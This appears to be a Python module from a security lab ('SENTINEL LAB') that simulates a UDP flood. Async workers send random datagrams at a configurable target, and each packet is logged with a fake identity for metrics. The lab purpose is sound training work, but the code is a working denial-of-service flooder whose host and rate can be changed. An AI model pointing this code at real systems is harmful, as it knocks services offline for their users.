"""UDP flood attack simulation module.

Fires a stream of UDP datagrams at the lab's DNS-like UDP target. Confined
to the isolated attacker_net/target_net.
"""
import argparse
import asyncio
import os
import socket
import time

from common.identity import random_fake_identity
from common.metrics import ACTIVE_WORKERS, ERRORS, REQUESTS_SENT, serve_metrics
from common.recorder import Recorder, SimEvent

ATTACK_TYPE = "udp_flood"


async def flood_worker(host: str, port: int, recorder: Recorder, stop_at: float, packets_per_sec: int):
    identity = random_fake_identity()
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setblocking(False)
    payload = os.urandom(64)
    interval = 1.0 / max(packets_per_sec, 1)
    while time.time() < stop_at:
        try:
            sock.sendto(payload, (host, port))
            REQUESTS_SENT.labels(attack_type=ATTACK_TYPE, target=f"{host}:{port}").inc()
        except Exception:
            ERRORS.labels(attack_type=ATTACK_TYPE, target=f"{host}:{port}").inc()
        recorder.record(
            SimEvent(
                ts=time.time(),
                attack_type=ATTACK_TYPE,
                target=f"{host}:{port}",
                fake_ip=identity.fake_ip,
                city=identity.city,
                lat=identity.lat,
                lon=identity.lon,
            )
        )
        await asyncio.sleep(interval)
    sock.close()


async def run(host: str, port: int, concurrency: int, duration: int, run_name: str, pps_per_worker: int):
    recorder = Recorder(run_name)
    stop_at = time.time() + duration
    ACTIVE_WORKERS.labels(attack_type=ATTACK_TYPE).set(concurrency)
    await asyncio.gather(
        *[flood_worker(host, port, recorder, stop_at, pps_per_worker) for _ in range(concurrency)]
    )
    ACTIVE_WORKERS.labels(attack_type=ATTACK_TYPE).set(0)
    recorder.close()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SENTINEL LAB: UDP flood simulation")
    parser.add_argument("--host", default=os.environ.get("TARGET_HOST", "dns-udp"))
    parser.add_argument("--port", type=int, default=int(os.environ.get("TARGET_PORT", "5300")))
    parser.add_argument("--concurrency", type=int, default=int(os.environ.get("CONCURRENCY", "20")))
    parser.add_argument("--pps-per-worker", type=int, default=int(os.environ.get("PPS_PER_WORKER", "50")))
    parser.add_argument("--duration", type=int, default=int(os.environ.get("DURATION", "60")))
    parser.add_argument("--run-name", default=os.environ.get("RUN_NAME", f"udp_flood_{int(time.time())}"))
    parser.add_argument("--metrics-port", type=int, default=int(os.environ.get("METRICS_PORT", "9402")))
    args = parser.parse_args()

    serve_metrics(args.metrics_port)
    asyncio.run(run(args.host, args.port, args.concurrency, args.duration, args.run_name, args.pps_per_worker))
